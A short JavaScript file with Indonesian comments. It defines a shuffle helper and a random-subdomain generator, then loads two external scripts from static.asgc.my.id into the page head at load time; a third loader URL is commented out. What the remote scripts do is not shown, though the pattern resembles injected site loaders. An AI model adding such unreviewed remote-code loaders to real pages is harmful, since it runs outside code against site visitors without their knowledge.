function getRandomItems(arr, num) {
    const shuffled = arr.sort(() => 0.5 - Math.random()); // Acak array
    return shuffled.slice(0, num); // Ambil sejumlah elemen yang diinginkan
}


function generateRandomSubdomain() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let length = Math.floor(Math.random() * 7) + 4; // Panjang antara 4 hingga 10
    let subdomain = '';

    for (let i = 0; i < length; i++) {
        if (i > 0 && i % 4 === 0) {
            subdomain += '-';
        }
        subdomain += chars.charAt(Math.floor(Math.random() * chars.length));
    }

    return subdomain;
}

function loadAsyncScript(url) {
    const script = document.createElement("script");
    script.src = url;
    script.type = "text/javascript";
    script.async = true;
    script.defer = true;

    script.onload = () => console.log(`Script ${url} loaded successfully`);
    script.onerror = () => console.error(`Failed to load script: ${url}`);

    document.head.appendChild(script);
}
loadAsyncScript("https://static.asgc.my.id/mydomain.js?v=1.2");
loadAsyncScript("https://static.asgc.my.id/in-v1.2.js");

// loadAsyncScript("https://3xjt2b.metain.my.id/front/in.js?v=1.2");
